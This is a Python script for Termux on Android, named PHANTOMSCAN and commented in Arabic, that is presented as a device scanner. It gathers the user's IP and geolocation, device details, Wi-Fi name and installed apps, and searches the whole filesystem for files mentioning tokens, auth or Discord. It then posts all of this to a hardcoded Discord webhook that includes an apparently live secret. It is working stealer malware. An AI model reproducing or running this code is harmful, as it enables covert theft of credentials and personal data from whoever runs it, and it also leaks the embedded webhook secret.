import os, platform, socket, requests, psutil, json, re, subprocess
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()
WEBHOOK_URL = "https://discord.com/api/webhooks/1404421036967067729/XENceK7LeoCJfrWUyrB2dDesp6NwtVdpJAFJAmCvoUo8t7QYT95vzJM6fTml9YXZqWHF"

# تثبيت المتطلبات تلقائي
def install_requirements():
    console.print("[bold yellow][PHANTOMSCAN][/bold yellow] Installing requirements... Please wait...")
    os.system("pkg update -y && pkg upgrade -y")
    os.system("pkg install python -y")
    os.system("pkg install termux-api -y")
    os.system("pip install requests psutil rich")
    console.print("[green]✔ Requirements installed successfully![/green]")

# الشعار
def banner():
    console.print("""
[bold red]
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     ███████║██╔██╗ ██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     ██╔══██║██║╚██╗██║
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝██║ ╚████║███████╗╚██████╗██║  ██║██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
[/bold red]
""")

# معلومات IP والموقع
def get_ip_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        return {
            "IP": ip,
            "Country": geo.get("country"),
            "Region": geo.get("regionName"),
            "City": geo.get("city"),
            "ZIP": geo.get("zip"),
            "ISP": geo.get("isp"),
            "Org": geo.get("org"),
            "Lat": geo.get("lat"),
            "Lon": geo.get("lon"),
            "Google Maps": f"https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}",
            "Timezone": geo.get("timezone"),
            "VPN/Proxy": geo.get("proxy")
        }
    except:
        return {"IP Info": "Failed"}

# معلومات الجهاز
def get_device_info():
    return {
        "System": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Node": platform.node(),
        "Platform": platform.platform(),
        "Hostname": socket.gethostname(),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2)
    }

# معلومات التخزين
def get_storage_info():
    usage = psutil.disk_usage('/')
    return {
        "Total (GB)": round(usage.total / (1024 ** 3), 2),
        "Used (GB)": round(usage.used / (1024 ** 3), 2),
        "Free (GB)": round(usage.free / (1024 ** 3), 2)
    }

# البطارية
def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        return {
            "Battery %": f"{battery.percent}%",
            "Plugged In": battery.power_plugged
        }
    except:
        return {"Battery": "N/A"}

# الواي فاي
def get_wifi_info():
    try:
        result = subprocess.check_output(["dumpsys", "wifi"]).decode()
        ssid = re.search(r'SSID: (.+)', result)
        return {"Wi-Fi SSID": ssid.group(1) if ssid else "Unknown"}
    except:
        return {"Wi-Fi SSID": "Cannot detect"}

# التطبيقات
def list_apps():
    try:
        output = subprocess.check_output(["pm", "list", "packages"]).decode()
        apps = [line.split(":")[-1] for line in output.splitlines()]
        return {"Installed Apps": apps[:30] + ["..."]}
    except:
        return {"Installed Apps": "Cannot access"}

# الملفات الحساسة
def search_sensitive_keywords():
    results = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith((".txt", ".log", ".json")):
                try:
                    path = os.path.join(root, file)
                    with open(path, "r", errors="ignore") as f:
                        content = f.read()
                        if re.search(r"(token|auth|discord)", content, re.IGNORECASE):
                            results.append(path)
                except:
                    continue
    return {"Sensitive Files": results[:10] + ["..."] if results else ["None"]}

# إرسال البيانات إلى الويب هوك
def send_to_webhook(data):
    embeds = []
    for section, content in data.items():
        if isinstance(content, dict):
            value = "\n".join([f"**{k}:** {v}" for k, v in content.items()])
        elif isinstance(content, list):
            value = "\n".join(content)
        else:
            value = str(content)
        embeds.append({
            "title": section,
            "description": value,
            "color": 16711680
        })
    try:
        requests.post(WEBHOOK_URL, json={"username": "PHANTOMSCAN", "embeds": embeds})
    except:
        console.print("[bold red]⚠ Failed to send to webhook")

# تشغيل الأداة
if __name__ == "__main__":
    install_requirements()
    banner()
    report = {
        "IP & Network Info": get_ip_info(),
        "Device Info": get_device_info(),
        "Storage Info": get_storage_info(),
        "Battery Info": get_battery_info(),
        "Wi-Fi Info": get_wifi_info(),
        "Installed Apps": list_apps(),
        "Sensitive Files": search_sensitive_keywords()
    }
    console.print(Panel.fit(json.dumps(report, indent=2), title="PHANTOMSCAN REPORT", border_style="green", box=box.DOUBLE))
    send_to_webhook(report)
